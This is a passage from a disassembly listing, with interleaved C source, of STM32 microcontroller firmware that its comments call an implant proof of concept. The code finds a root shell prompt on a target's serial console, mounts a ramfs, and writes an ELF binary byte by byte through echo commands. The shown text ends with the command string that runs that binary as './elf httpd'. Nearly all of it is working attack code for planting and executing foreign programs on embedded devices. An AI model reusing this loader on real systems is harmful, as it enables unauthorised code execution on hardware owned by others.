 8001160:	615a      	str	r2, [r3, #20]
          if(huart->hdmarx != NULL)
 8001162:	b150      	cbz	r0, 800117a <HAL_UART_IRQHandler+0xba>
            huart->hdmarx->XferAbortCallback = UART_DMAAbortOnError;
 8001164:	4b25      	ldr	r3, [pc, #148]	; (80011fc <HAL_UART_IRQHandler+0x13c>)
 8001166:	6343      	str	r3, [r0, #52]	; 0x34
            if(HAL_DMA_Abort_IT(huart->hdmarx) != HAL_OK)
 8001168:	f7ff f920 	bl	80003ac <HAL_DMA_Abort_IT>
 800116c:	2800      	cmp	r0, #0
 800116e:	d044      	beq.n	80011fa <HAL_UART_IRQHandler+0x13a>
              huart->hdmarx->XferAbortCallback(huart->hdmarx);
 8001170:	6b60      	ldr	r0, [r4, #52]	; 0x34
}
 8001172:	e8bd 4070 	ldmia.w	sp!, {r4, r5, r6, lr}
              huart->hdmarx->XferAbortCallback(huart->hdmarx);
 8001176:	6b43      	ldr	r3, [r0, #52]	; 0x34
 8001178:	4718      	bx	r3
            HAL_UART_ErrorCallback(huart);
 800117a:	4620      	mov	r0, r4
 800117c:	f7ff ff77 	bl	800106e <HAL_UART_ErrorCallback>
 8001180:	bd70      	pop	{r4, r5, r6, pc}
        HAL_UART_ErrorCallback(huart);
 8001182:	f7ff ff74 	bl	800106e <HAL_UART_ErrorCallback>
        huart->ErrorCode = HAL_UART_ERROR_NONE;
 8001186:	63e5      	str	r5, [r4, #60]	; 0x3c
 8001188:	bd70      	pop	{r4, r5, r6, pc}
  if(((isrflags & USART_SR_TXE) != RESET) && ((cr1its & USART_CR1_TXEIE) != RESET))
 800118a:	0616      	lsls	r6, r2, #24
 800118c:	d527      	bpl.n	80011de <HAL_UART_IRQHandler+0x11e>
 800118e:	060d      	lsls	r5, r1, #24
 8001190:	d525      	bpl.n	80011de <HAL_UART_IRQHandler+0x11e>
  if(huart->gState == HAL_UART_STATE_BUSY_TX)
 8001192:	f894 2039 	ldrb.w	r2, [r4, #57]	; 0x39
 8001196:	2a21      	cmp	r2, #33	; 0x21
 8001198:	d12f      	bne.n	80011fa <HAL_UART_IRQHandler+0x13a>
    if(huart->Init.WordLength == UART_WORDLENGTH_9B)
 800119a:	68a2      	ldr	r2, [r4, #8]
 800119c:	f5b2 5f80 	cmp.w	r2, #4096	; 0x1000
 80011a0:	6a22      	ldr	r2, [r4, #32]
 80011a2:	d117      	bne.n	80011d4 <HAL_UART_IRQHandler+0x114>
      huart->Instance->DR = (uint16_t)(*tmp & (uint16_t)0x01FF);
 80011a4:	8811      	ldrh	r1, [r2, #0]
 80011a6:	f3c1 0108 	ubfx	r1, r1, #0, #9
 80011aa:	6059      	str	r1, [r3, #4]
      if(huart->Init.Parity == UART_PARITY_NONE)
 80011ac:	6921      	ldr	r1, [r4, #16]
 80011ae:	b979      	cbnz	r1, 80011d0 <HAL_UART_IRQHandler+0x110>
        huart->pTxBuffPtr += 2U;
 80011b0:	3202      	adds	r2, #2
        huart->pTxBuffPtr += 1U;
 80011b2:	6222      	str	r2, [r4, #32]
    if(--huart->TxXferCount == 0U)
 80011b4:	8ce2      	ldrh	r2, [r4, #38]	; 0x26
 80011b6:	3a01      	subs	r2, #1
 80011b8:	b292      	uxth	r2, r2
 80011ba:	84e2      	strh	r2, [r4, #38]	; 0x26
 80011bc:	b9ea      	cbnz	r2, 80011fa <HAL_UART_IRQHandler+0x13a>
      __HAL_UART_DISABLE_IT(huart, UART_IT_TXE);
 80011be:	68da      	ldr	r2, [r3, #12]
 80011c0:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 80011c4:	60da      	str	r2, [r3, #12]
      __HAL_UART_ENABLE_IT(huart, UART_IT_TC);
 80011c6:	68da      	ldr	r2, [r3, #12]
 80011c8:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80011cc:	60da      	str	r2, [r3, #12]
 80011ce:	bd70      	pop	{r4, r5, r6, pc}
        huart->pTxBuffPtr += 1U;
 80011d0:	3201      	adds	r2, #1
 80011d2:	e7ee      	b.n	80011b2 <HAL_UART_IRQHandler+0xf2>
      huart->Instance->DR = (uint8_t)(*huart->pTxBuffPtr++ & (uint8_t)0x00FF);
 80011d4:	1c51      	adds	r1, r2, #1
 80011d6:	6221      	str	r1, [r4, #32]
 80011d8:	7812      	ldrb	r2, [r2, #0]
 80011da:	605a      	str	r2, [r3, #4]
 80011dc:	e7ea      	b.n	80011b4 <HAL_UART_IRQHandler+0xf4>
  if(((isrflags & USART_SR_TC) != RESET) && ((cr1its & USART_CR1_TCIE) != RESET))
 80011de:	0650      	lsls	r0, r2, #25
 80011e0:	d50b      	bpl.n	80011fa <HAL_UART_IRQHandler+0x13a>
 80011e2:	064a      	lsls	r2, r1, #25
 80011e4:	d509      	bpl.n	80011fa <HAL_UART_IRQHandler+0x13a>
  __HAL_UART_DISABLE_IT(huart, UART_IT_TC);
 80011e6:	68da      	ldr	r2, [r3, #12]
  HAL_UART_TxCpltCallback(huart);
 80011e8:	4620      	mov	r0, r4
  __HAL_UART_DISABLE_IT(huart, UART_IT_TC);
 80011ea:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 80011ee:	60da      	str	r2, [r3, #12]
  huart->gState = HAL_UART_STATE_READY;
 80011f0:	2320      	movs	r3, #32
 80011f2:	f884 3039 	strb.w	r3, [r4, #57]	; 0x39
  HAL_UART_TxCpltCallback(huart);
 80011f6:	f7ff fed9 	bl	8000fac <HAL_UART_TxCpltCallback>
 80011fa:	bd70      	pop	{r4, r5, r6, pc}
 80011fc:	08001201 	.word	0x08001201

08001200 <UART_DMAAbortOnError>:
{
 8001200:	b508      	push	{r3, lr}
  huart->RxXferCount = 0x00U;
 8001202:	2300      	movs	r3, #0
  UART_HandleTypeDef* huart = ( UART_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;
 8001204:	6a40      	ldr	r0, [r0, #36]	; 0x24
  huart->RxXferCount = 0x00U;
 8001206:	85c3      	strh	r3, [r0, #46]	; 0x2e
  huart->TxXferCount = 0x00U;
 8001208:	84c3      	strh	r3, [r0, #38]	; 0x26
  HAL_UART_ErrorCallback(huart);
 800120a:	f7ff ff30 	bl	800106e <HAL_UART_ErrorCallback>
 800120e:	bd08      	pop	{r3, pc}

08001210 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8001210:	b500      	push	{lr}
 8001212:	b091      	sub	sp, #68	; 0x44
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8001214:	2228      	movs	r2, #40	; 0x28
 8001216:	2100      	movs	r1, #0
 8001218:	a806      	add	r0, sp, #24
 800121a:	f000 fbf8 	bl	8001a0e <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 800121e:	2214      	movs	r2, #20
 8001220:	2100      	movs	r1, #0
 8001222:	a801      	add	r0, sp, #4
 8001224:	f000 fbf3 	bl	8001a0e <memset>

  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
 8001228:	2302      	movs	r3, #2
 800122a:	9306      	str	r3, [sp, #24]
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
 800122c:	2301      	movs	r3, #1
 800122e:	930a      	str	r3, [sp, #40]	; 0x28
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
 8001230:	2310      	movs	r3, #16
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8001232:	a806      	add	r0, sp, #24
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
 8001234:	930b      	str	r3, [sp, #44]	; 0x2c
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8001236:	f7ff fa79 	bl	800072c <HAL_RCC_OscConfig>
  }
  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
 800123a:	2100      	movs	r1, #0
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 800123c:	230f      	movs	r3, #15
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK)
 800123e:	a801      	add	r0, sp, #4
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8001240:	9301      	str	r3, [sp, #4]
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
 8001242:	9102      	str	r1, [sp, #8]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8001244:	9103      	str	r1, [sp, #12]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8001246:	9104      	str	r1, [sp, #16]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8001248:	9105      	str	r1, [sp, #20]
  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK)
 800124a:	f7ff fc37 	bl	8000abc <HAL_RCC_ClockConfig>
  {
    Error_Handler();
  }
}
 800124e:	b011      	add	sp, #68	; 0x44
 8001250:	f85d fb04 	ldr.w	pc, [sp], #4

08001254 <HAL_UART_RxCpltCallback>:
 * to g_buff(global buffer).The maximum size is defined in RX_BUFF_SIZE
 * constant.
 */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart)
{
  if (huart->Instance == USART1)
 8001254:	6802      	ldr	r2, [r0, #0]
 8001256:	4b08      	ldr	r3, [pc, #32]	; (8001278 <HAL_UART_RxCpltCallback+0x24>)
{
 8001258:	b510      	push	{r4, lr}
  if (huart->Instance == USART1)
 800125a:	429a      	cmp	r2, r3
 800125c:	d10b      	bne.n	8001276 <HAL_UART_RxCpltCallback+0x22>
  {
    if (g_rx_buff_size <= (RX_BUFF_SIZE - 1))
 800125e:	4b07      	ldr	r3, [pc, #28]	; (800127c <HAL_UART_RxCpltCallback+0x28>)
 8001260:	781c      	ldrb	r4, [r3, #0]
 8001262:	2c63      	cmp	r4, #99	; 0x63
 8001264:	d807      	bhi.n	8001276 <HAL_UART_RxCpltCallback+0x22>
    {
      memcpy((void *)g_buff, (void *)g_rx_buff, g_rx_buff_size);
 8001266:	4b06      	ldr	r3, [pc, #24]	; (8001280 <HAL_UART_RxCpltCallback+0x2c>)
 8001268:	4622      	mov	r2, r4
 800126a:	4906      	ldr	r1, [pc, #24]	; (8001284 <HAL_UART_RxCpltCallback+0x30>)
 800126c:	4618      	mov	r0, r3
 800126e:	f000 fbc3 	bl	80019f8 <memcpy>
      g_buff[g_rx_buff_size] = 0x00;
 8001272:	2200      	movs	r2, #0
 8001274:	5502      	strb	r2, [r0, r4]
 8001276:	bd10      	pop	{r4, pc}
 8001278:	40013800 	.word	0x40013800
 800127c:	20001a90 	.word	0x20001a90
 8001280:	20001964 	.word	0x20001964
 8001284:	20001900 	.word	0x20001900

08001288 <search_string_on_global_buffer>:
/*
 * This function performs several strstr calls on g_buff(global buffer)
 * using the string parameter. Useful to wait for g_buff to sync.
 */
uint8_t search_string_on_global_buffer(uint8_t seconds, char *string)
{
 8001288:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
  for(uint8_t i = 0; i < (seconds * 10); i++)
 800128a:	240a      	movs	r4, #10
{
 800128c:	460e      	mov	r6, r1
  for(uint8_t i = 0; i < (seconds * 10); i++)
 800128e:	2500      	movs	r5, #0
 8001290:	4344      	muls	r4, r0
  {
    if (strstr(g_buff, string) != NULL)
 8001292:	4f09      	ldr	r7, [pc, #36]	; (80012b8 <search_string_on_global_buffer+0x30>)
  for(uint8_t i = 0; i < (seconds * 10); i++)
 8001294:	b2eb      	uxtb	r3, r5
 8001296:	42a3      	cmp	r3, r4
 8001298:	db01      	blt.n	800129e <search_string_on_global_buffer+0x16>
      return 1;
    HAL_Delay(100);
  }
  return 0;
 800129a:	2000      	movs	r0, #0
 800129c:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
    if (strstr(g_buff, string) != NULL)
 800129e:	4631      	mov	r1, r6
 80012a0:	4638      	mov	r0, r7
 80012a2:	f000 fbf1 	bl	8001a88 <strstr>
 80012a6:	3501      	adds	r5, #1
 80012a8:	b918      	cbnz	r0, 80012b2 <search_string_on_global_buffer+0x2a>
    HAL_Delay(100);
 80012aa:	2064      	movs	r0, #100	; 0x64
 80012ac:	f7fe ff96 	bl	80001dc <HAL_Delay>
 80012b0:	e7f0      	b.n	8001294 <search_string_on_global_buffer+0xc>
      return 1;
 80012b2:	2001      	movs	r0, #1

}
 80012b4:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
 80012b6:	bf00      	nop
 80012b8:	20001964 	.word	0x20001964

080012bc <is_root_shell_prompt_present>:
{
  // TODO: remove commented code.
  // if (strstr(g_buff, " # ") != NULL);
  //    return 1;
  // return 0;
  return search_string_on_global_buffer(5, " # ");
 80012bc:	4901      	ldr	r1, [pc, #4]	; (80012c4 <is_root_shell_prompt_present+0x8>)
 80012be:	2005      	movs	r0, #5
 80012c0:	f7ff bfe2 	b.w	8001288 <search_string_on_global_buffer>
 80012c4:	080022f7 	.word	0x080022f7

080012c8 <transmit_carriage_return_and_newline>:
/*
 * This function transmits a carriage return and new line through UART.
 *
 */
void transmit_carriage_return_and_newline()
{
 80012c8:	b507      	push	{r0, r1, r2, lr}
  char msg[] = "\r\n";
 80012ca:	4b08      	ldr	r3, [pc, #32]	; (80012ec <transmit_carriage_return_and_newline+0x24>)
  HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 1000);
 80012cc:	a901      	add	r1, sp, #4
  char msg[] = "\r\n";
 80012ce:	881a      	ldrh	r2, [r3, #0]
 80012d0:	789b      	ldrb	r3, [r3, #2]
 80012d2:	f8ad 2004 	strh.w	r2, [sp, #4]
 80012d6:	f88d 3006 	strb.w	r3, [sp, #6]
  HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 1000);
 80012da:	2202      	movs	r2, #2
 80012dc:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80012e0:	4803      	ldr	r0, [pc, #12]	; (80012f0 <transmit_carriage_return_and_newline+0x28>)
 80012e2:	f7ff fdbf 	bl	8000e64 <HAL_UART_Transmit>
}
 80012e6:	b003      	add	sp, #12
 80012e8:	f85d fb04 	ldr.w	pc, [sp], #4
 80012ec:	080023e6 	.word	0x080023e6
 80012f0:	20001a50 	.word	0x20001a50

080012f4 <set_current_working_directory>:

/*
 * This function sets the current working directory. If fails returns 1.
 */
uint8_t set_current_working_directory()
{
 80012f4:	b510      	push	{r4, lr}
  char target_cmd[] = "cd var\r\n";
 80012f6:	4a19      	ldr	r2, [pc, #100]	; (800135c <set_current_working_directory+0x68>)
{
 80012f8:	b086      	sub	sp, #24
  char target_cmd[] = "cd var\r\n";
 80012fa:	6810      	ldr	r0, [r2, #0]
 80012fc:	6851      	ldr	r1, [r2, #4]
 80012fe:	ab03      	add	r3, sp, #12
 8001300:	c303      	stmia	r3!, {r0, r1}
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 8001302:	4c17      	ldr	r4, [pc, #92]	; (8001360 <set_current_working_directory+0x6c>)
  char target_cmd[] = "cd var\r\n";
 8001304:	7a12      	ldrb	r2, [r2, #8]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 8001306:	a903      	add	r1, sp, #12
  char target_cmd[] = "cd var\r\n";
 8001308:	701a      	strb	r2, [r3, #0]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 800130a:	4620      	mov	r0, r4
 800130c:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001310:	2208      	movs	r2, #8
 8001312:	f7ff fda7 	bl	8000e64 <HAL_UART_Transmit>
  HAL_Delay(500);
 8001316:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 800131a:	f7fe ff5f 	bl	80001dc <HAL_Delay>
  char verification_cmd[] = "pwd\r\n";
  g_rx_buff_size = 20;
 800131e:	2214      	movs	r2, #20
  char verification_cmd[] = "pwd\r\n";
 8001320:	4b10      	ldr	r3, [pc, #64]	; (8001364 <set_current_working_directory+0x70>)
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 8001322:	4911      	ldr	r1, [pc, #68]	; (8001368 <set_current_working_directory+0x74>)
  char verification_cmd[] = "pwd\r\n";
 8001324:	6818      	ldr	r0, [r3, #0]
 8001326:	889b      	ldrh	r3, [r3, #4]
 8001328:	9001      	str	r0, [sp, #4]
 800132a:	f8ad 3008 	strh.w	r3, [sp, #8]
  g_rx_buff_size = 20;
 800132e:	4b0f      	ldr	r3, [pc, #60]	; (800136c <set_current_working_directory+0x78>)
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 8001330:	4620      	mov	r0, r4
  g_rx_buff_size = 20;
 8001332:	701a      	strb	r2, [r3, #0]
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 8001334:	f7ff fdf2 	bl	8000f1c <HAL_UART_Receive_DMA>
  HAL_UART_Transmit(&huart1, (uint8_t *)&verification_cmd, sizeof(verification_cmd) - 1, 1000);
 8001338:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 800133c:	2205      	movs	r2, #5
 800133e:	a901      	add	r1, sp, #4
 8001340:	4620      	mov	r0, r4
 8001342:	f7ff fd8f 	bl	8000e64 <HAL_UART_Transmit>
  if (search_string_on_global_buffer(5, "pwd\r\n/var\r\n") == 1)
 8001346:	490a      	ldr	r1, [pc, #40]	; (8001370 <set_current_working_directory+0x7c>)
 8001348:	2005      	movs	r0, #5
 800134a:	f7ff ff9d 	bl	8001288 <search_string_on_global_buffer>
    return 0;
  return 1;
}
 800134e:	f110 30ff 	adds.w	r0, r0, #4294967295
 8001352:	bf18      	it	ne
 8001354:	2001      	movne	r0, #1
 8001356:	b006      	add	sp, #24
 8001358:	bd10      	pop	{r4, pc}
 800135a:	bf00      	nop
 800135c:	08002424 	.word	0x08002424
 8001360:	20001a50 	.word	0x20001a50
 8001364:	0800242d 	.word	0x0800242d
 8001368:	20001900 	.word	0x20001900
 800136c:	20001a90 	.word	0x20001a90
 8001370:	08002418 	.word	0x08002418

08001374 <create_poc_directory>:
/*
 * This function creates the PoC directory that is going to be use to
 * mount the RAMFS. If fails returns 1.
 */
uint8_t create_poc_directory()
{
 8001374:	b510      	push	{r4, lr}
  char target_cmd[] = "mkdir PoC\r\n";
 8001376:	4a19      	ldr	r2, [pc, #100]	; (80013dc <create_poc_directory+0x68>)
{
 8001378:	b086      	sub	sp, #24
  char target_cmd[] = "mkdir PoC\r\n";
 800137a:	6810      	ldr	r0, [r2, #0]
 800137c:	6851      	ldr	r1, [r2, #4]
 800137e:	ab03      	add	r3, sp, #12
 8001380:	c303      	stmia	r3!, {r0, r1}
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 8001382:	4c17      	ldr	r4, [pc, #92]	; (80013e0 <create_poc_directory+0x6c>)
  char target_cmd[] = "mkdir PoC\r\n";
 8001384:	6890      	ldr	r0, [r2, #8]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 8001386:	a903      	add	r1, sp, #12
  char target_cmd[] = "mkdir PoC\r\n";
 8001388:	6018      	str	r0, [r3, #0]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 800138a:	220b      	movs	r2, #11
 800138c:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001390:	4620      	mov	r0, r4
 8001392:	f7ff fd67 	bl	8000e64 <HAL_UART_Transmit>
  HAL_Delay(500);
 8001396:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 800139a:	f7fe ff1f 	bl	80001dc <HAL_Delay>
  char verification_cmd[] = "ls\r\n";
  g_rx_buff_size = 99;
 800139e:	2263      	movs	r2, #99	; 0x63
  char verification_cmd[] = "ls\r\n";
 80013a0:	4b10      	ldr	r3, [pc, #64]	; (80013e4 <create_poc_directory+0x70>)
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 80013a2:	4911      	ldr	r1, [pc, #68]	; (80013e8 <create_poc_directory+0x74>)
  char verification_cmd[] = "ls\r\n";
 80013a4:	6818      	ldr	r0, [r3, #0]
 80013a6:	791b      	ldrb	r3, [r3, #4]
 80013a8:	9001      	str	r0, [sp, #4]
 80013aa:	f88d 3008 	strb.w	r3, [sp, #8]
  g_rx_buff_size = 99;
 80013ae:	4b0f      	ldr	r3, [pc, #60]	; (80013ec <create_poc_directory+0x78>)
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 80013b0:	4620      	mov	r0, r4
  g_rx_buff_size = 99;
 80013b2:	701a      	strb	r2, [r3, #0]
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 80013b4:	f7ff fdb2 	bl	8000f1c <HAL_UART_Receive_DMA>
  HAL_UART_Transmit(&huart1, (uint8_t *)&verification_cmd, sizeof(verification_cmd) - 1, 1000);
 80013b8:	2204      	movs	r2, #4
 80013ba:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80013be:	eb0d 0102 	add.w	r1, sp, r2
 80013c2:	4620      	mov	r0, r4
 80013c4:	f7ff fd4e 	bl	8000e64 <HAL_UART_Transmit>
  if (search_string_on_global_buffer(5, "    PoC\r\n") == 1)
 80013c8:	4909      	ldr	r1, [pc, #36]	; (80013f0 <create_poc_directory+0x7c>)
 80013ca:	2005      	movs	r0, #5
 80013cc:	f7ff ff5c 	bl	8001288 <search_string_on_global_buffer>
    return 0;
  return 1;
}
 80013d0:	f110 30ff 	adds.w	r0, r0, #4294967295
 80013d4:	bf18      	it	ne
 80013d6:	2001      	movne	r0, #1
 80013d8:	b006      	add	sp, #24
 80013da:	bd10      	pop	{r4, pc}
 80013dc:	080022e6 	.word	0x080022e6
 80013e0:	20001a50 	.word	0x20001a50
 80013e4:	080022f2 	.word	0x080022f2
 80013e8:	20001900 	.word	0x20001900
 80013ec:	20001a90 	.word	0x20001a90
 80013f0:	080022dc 	.word	0x080022dc

080013f4 <mount_implant_ramfs>:
 * This function mounts a RAMFS where the implant is going to write
 * the ELF executable. If fails returns 1.
 */

uint8_t mount_implant_ramfs()
{
 80013f4:	b570      	push	{r4, r5, r6, lr}
 80013f6:	b08e      	sub	sp, #56	; 0x38
  char target_cmd[] = "mount -t ramfs -o size=1m ramfs PoC\r\n";
 80013f8:	aa04      	add	r2, sp, #16
 80013fa:	4615      	mov	r5, r2
 80013fc:	4b17      	ldr	r3, [pc, #92]	; (800145c <mount_implant_ramfs+0x68>)
 80013fe:	f103 0620 	add.w	r6, r3, #32
 8001402:	4614      	mov	r4, r2
 8001404:	6818      	ldr	r0, [r3, #0]
 8001406:	6859      	ldr	r1, [r3, #4]
 8001408:	3308      	adds	r3, #8
 800140a:	c403      	stmia	r4!, {r0, r1}
 800140c:	42b3      	cmp	r3, r6
 800140e:	4622      	mov	r2, r4
 8001410:	d1f7      	bne.n	8001402 <mount_implant_ramfs+0xe>
 8001412:	6818      	ldr	r0, [r3, #0]
 8001414:	889b      	ldrh	r3, [r3, #4]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 8001416:	4629      	mov	r1, r5
  char target_cmd[] = "mount -t ramfs -o size=1m ramfs PoC\r\n";
 8001418:	6020      	str	r0, [r4, #0]
 800141a:	80a3      	strh	r3, [r4, #4]
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
 800141c:	2225      	movs	r2, #37	; 0x25
 800141e:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001422:	480f      	ldr	r0, [pc, #60]	; (8001460 <mount_implant_ramfs+0x6c>)
 8001424:	f7ff fd1e 	bl	8000e64 <HAL_UART_Transmit>
  HAL_Delay(500);
 8001428:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 800142c:	f7fe fed6 	bl	80001dc <HAL_Delay>
  // TODO: perform verification.
  char cmd[] = "cd PoC\r\n";
 8001430:	4a0c      	ldr	r2, [pc, #48]	; (8001464 <mount_implant_ramfs+0x70>)
 8001432:	ab01      	add	r3, sp, #4
 8001434:	6810      	ldr	r0, [r2, #0]
 8001436:	6851      	ldr	r1, [r2, #4]
 8001438:	7a12      	ldrb	r2, [r2, #8]
 800143a:	c303      	stmia	r3!, {r0, r1}
  HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
 800143c:	a901      	add	r1, sp, #4
  char cmd[] = "cd PoC\r\n";
 800143e:	701a      	strb	r2, [r3, #0]
  HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
 8001440:	4807      	ldr	r0, [pc, #28]	; (8001460 <mount_implant_ramfs+0x6c>)
 8001442:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001446:	2208      	movs	r2, #8
 8001448:	f7ff fd0c 	bl	8000e64 <HAL_UART_Transmit>
  HAL_Delay(500);
 800144c:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8001450:	f7fe fec4 	bl	80001dc <HAL_Delay>
  return 0;
}
 8001454:	2000      	movs	r0, #0
 8001456:	b00e      	add	sp, #56	; 0x38
 8001458:	bd70      	pop	{r4, r5, r6, pc}
 800145a:	bf00      	nop
 800145c:	080023e9 	.word	0x080023e9
 8001460:	20001a50 	.word	0x20001a50
 8001464:	0800240f 	.word	0x0800240f

08001468 <upload_elf>:
/*
 * This function transmits the elf char array defined in elf.h using the echo command.
 *
 */
uint8_t upload_elf()
{
 8001468:	e92d 41f0 	stmdb	sp!, {r4, r5, r6, r7, r8, lr}
 800146c:	4e20      	ldr	r6, [pc, #128]	; (80014f0 <upload_elf+0x88>)
  uint elf_length = sizeof(elf);
  for (uint idx = 0; idx < elf_length; idx += 8)
  {
    int cnt = 0;
    const char cmd_format[] = "echo \"\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\c\" >> elf\r\n";
 800146e:	4f21      	ldr	r7, [pc, #132]	; (80014f4 <upload_elf+0x8c>)
  for (uint idx = 0; idx < elf_length; idx += 8)
 8001470:	4634      	mov	r4, r6
    char cmd[70] = { 0x00 };
    cnt = snprintf(cmd, sizeof(cmd), cmd_format, elf[idx], elf[idx+1], elf[idx+2], elf[idx+3], elf[idx+4], elf[idx+5], elf[idx+6], elf[idx+7]);
    if (cnt != 50)
      return 1;
    HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
 8001472:	f8df 8084 	ldr.w	r8, [pc, #132]	; 80014f8 <upload_elf+0x90>
{
 8001476:	b0ac      	sub	sp, #176	; 0xb0
    const char cmd_format[] = "echo \"\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\c\" >> elf\r\n";
 8001478:	2243      	movs	r2, #67	; 0x43
 800147a:	4639      	mov	r1, r7
 800147c:	a809      	add	r0, sp, #36	; 0x24
 800147e:	f000 fabb 	bl	80019f8 <memcpy>
    char cmd[70] = { 0x00 };
 8001482:	2246      	movs	r2, #70	; 0x46
 8001484:	2100      	movs	r1, #0
 8001486:	a81a      	add	r0, sp, #104	; 0x68
 8001488:	f000 fac1 	bl	8001a0e <memset>
    cnt = snprintf(cmd, sizeof(cmd), cmd_format, elf[idx], elf[idx+1], elf[idx+2], elf[idx+3], elf[idx+4], elf[idx+5], elf[idx+6], elf[idx+7]);
 800148c:	79e2      	ldrb	r2, [r4, #7]
 800148e:	7823      	ldrb	r3, [r4, #0]
 8001490:	9206      	str	r2, [sp, #24]
 8001492:	79a2      	ldrb	r2, [r4, #6]
 8001494:	2146      	movs	r1, #70	; 0x46
 8001496:	9205      	str	r2, [sp, #20]
 8001498:	7962      	ldrb	r2, [r4, #5]
 800149a:	a81a      	add	r0, sp, #104	; 0x68
 800149c:	9204      	str	r2, [sp, #16]
 800149e:	7922      	ldrb	r2, [r4, #4]
 80014a0:	1ba5      	subs	r5, r4, r6
 80014a2:	9203      	str	r2, [sp, #12]
 80014a4:	78e2      	ldrb	r2, [r4, #3]
 80014a6:	9202      	str	r2, [sp, #8]
 80014a8:	78a2      	ldrb	r2, [r4, #2]
 80014aa:	9201      	str	r2, [sp, #4]
 80014ac:	7862      	ldrb	r2, [r4, #1]
 80014ae:	9200      	str	r2, [sp, #0]
 80014b0:	aa09      	add	r2, sp, #36	; 0x24
 80014b2:	f000 fab5 	bl	8001a20 <sniprintf>
    if (cnt != 50)
 80014b6:	2832      	cmp	r0, #50	; 0x32
 80014b8:	d003      	beq.n	80014c2 <upload_elf+0x5a>
  char exec_cmd[] = "./elf httpd\r\n";
